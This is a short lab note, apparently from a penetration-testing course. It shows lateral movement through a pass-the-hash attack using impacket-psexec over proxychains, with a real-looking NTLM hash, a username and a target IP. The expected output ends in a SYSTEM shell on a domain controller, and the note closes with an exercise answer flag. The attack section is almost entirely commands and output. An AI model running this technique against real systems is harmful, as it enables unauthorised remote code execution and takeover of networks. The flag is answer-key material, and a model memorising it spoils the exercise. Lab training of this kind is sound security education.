# Lateral Movement

Using psexec to get an interactive shell
>``` shell
>kali@kali:~$ proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.6.240
>
># ========== Expected Result ==========
>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
>
>[*] Requesting shares on 172.16.6.240.....
>[*] Found writable share ADMIN$
>[*] Uploading file CGOrpfCz.exe
>[*] Opening SVCManager on 172.16.6.240.....
>[*] Creating service tahE on 172.16.6.240.....
>[*] Starting service tahE.....
>[!] Press help for extra shell commands
>Microsoft Windows [Version 10.0.20348.1006]
>(c) Microsoft Corporation. All rights reserved.
># =====================================
>
>C:\Windows\system32> whoami
>
># ========== Expected Result ==========
>nt authority\system
># =====================================
>
>C:\Windows\system32> hostname
>
># ========== Expected Result ==========
>DCSRV1
># =====================================
>
>C:\Windows\system32> ipconfig
>
># ========== Expected Result ==========
>Windows IP Configuration
>
>
>Ethernet adapter Ethernet0:
>
>   Connection-specific DNS Suffix  . : 
>   IPv4 Address. . . . . . . . . . . : 172.16.6.240
>   Subnet Mask . . . . . . . . . . . : 255.255.255.0
>   Default Gateway . . . . . . . . . : 172.16.6.254
># =====================================
>```

Lab 1 - In a real assessment, we'd now create a penetration testing report for our client to inform them about our findings. Attached is an example report for the penetration test of BEYOND Finances. Read the report, find the flag at the end of the document, and enter it as answer to this exercise.
>Report_Writing_Is_Fun
